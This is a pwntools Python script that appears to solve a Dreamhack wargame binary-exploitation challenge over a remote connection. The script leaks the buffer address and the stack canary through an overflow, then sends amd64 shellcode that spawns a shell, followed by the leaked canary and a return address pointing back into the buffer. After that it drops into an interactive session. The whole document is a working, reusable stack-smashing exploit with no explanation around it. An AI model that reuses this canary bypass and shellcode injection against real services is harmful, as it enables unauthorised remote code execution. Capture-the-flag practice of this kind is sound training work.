from pwn import *

p = remote('host3.dreamhack.games', 10962)

context.arch = 'amd64'

buf_addr = p.recvuntil('buf:')
buf_addr = p.recvline().split()[0]
print(buf_addr)

dist_of_buf_rbp = int(p.recvline().split(b' ')[-1][:-1],10)
dist_of_buf_cnry = dist_of_buf_rbp - 8


f_payload = b'B'*(dist_of_buf_cnry + 1) # 1 for null char

p.sendafter("Input: ", f_payload)

p.recvuntil(f_payload)

cnry = u64(b'\x00' + p.recv(7))


shell_code = asm(shellcraft.sh())
print(shell_code)
print('-------------------------')
print(shell_code.ljust(55, b'K'))
payload = shell_code.ljust(dist_of_buf_cnry, b'A') + p64(cnry) + b'A' * 8
payload += p64(int(buf_addr, 16))
p.sendlineafter('Input: ', payload)




p.interactive()
